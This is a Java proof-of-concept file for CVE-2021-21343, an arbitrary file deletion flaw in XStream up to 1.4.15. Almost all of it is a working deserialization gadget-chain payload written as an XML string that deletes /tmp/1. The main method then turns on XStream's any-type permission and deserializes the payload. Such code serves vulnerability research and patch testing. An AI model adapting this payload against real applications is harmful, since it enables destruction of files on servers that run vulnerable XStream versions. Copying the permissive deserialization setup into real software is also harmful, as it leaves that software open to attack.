package org.example;

import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.security.AnyTypePermission;

/**
 * Arbitrary File Deletion <=1.4.15
 */
public class CVE_2021_21343 {
    public static void main(String[] args) {
        String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>\n" +
                "        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>\n" +
                "          <packet>\n" +
                "            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>\n" +
                "              <dataSource class='com.sun.xml.internal.ws.encoding.MIMEPartStreamingDataHandler$StreamingDataSource'>\n" +
                "                <part>\n" +
                "                  <dataHead>\n" +
                "                    <tail/>\n" +
                "                    <head>\n" +
                "                      <data class='com.sun.xml.internal.org.jvnet.mimepull.MemoryData'>\n" +
                "                        <len>3</len>\n" +
                "                        <data>AQID</data>\n" +
                "                      </data>\n" +
                "                    </head>\n" +
                "                  </dataHead>\n" +
                "                  <contentTransferEncoding>base64</contentTransferEncoding>\n" +
                "                  <msg>\n" +
                "                    <it class='java.util.ArrayList$Itr'>\n" +
                "                      <cursor>0</cursor>\n" +
                "                      <lastRet>1</lastRet>\n" +
                "                      <expectedModCount>4</expectedModCount>\n" +
                "                        <outer-class>\n" +
                "                          <com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/>\n" +
                "                          <com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/>\n" +
                "                          <com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/>\n" +
                "                          <com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/>\n" +
                "                        </outer-class>\n" +
                "                    </it>\n" +
                "                    <in class='java.io.FileInputStream'>\n" +
                "                      <fd/>\n" +
                "                      <channel class='sun.nio.ch.FileChannelImpl'>\n" +
                "                        <closeLock/>\n" +
                "                        <open>true</open>\n" +
                "                        <threads>\n" +
                "                          <used>-1</used>\n" +
                "                        </threads>\n" +
                "                        <parent class='sun.plugin2.ipc.unix.DomainSocketNamedPipe'>\n" +
                "                          <sockClient>\n" +
                "                            <fileName>/tmp/1</fileName>\n" +
                "                            <unlinkFile>true</unlinkFile>\n" +
                "                          </sockClient>\n" +
                "                          <connectionSync/>\n" +
                "                        </parent>\n" +
                "                      </channel>\n" +
                "                      <closeLock/>\n" +
                "                    </in>\n" +
                "                  </msg>\n" +
                "                </part>\n" +
                "              </dataSource>\n" +
                "            </message>\n" +
                "            <satellites/>\n" +
                "            <invocationProperties/>\n" +
                "          </packet>\n" +
                "        </indexMap>\n" +
                "      </comparator>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <string>javax.xml.ws.binding.attachments.inbound</string>\n" +
                "    <string>javax.xml.ws.binding.attachments.inbound</string>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";

        XStream xstream = new XStream();
        xstream.addPermission(AnyTypePermission.ANY);
        xstream.fromXML(xml);
    }

}
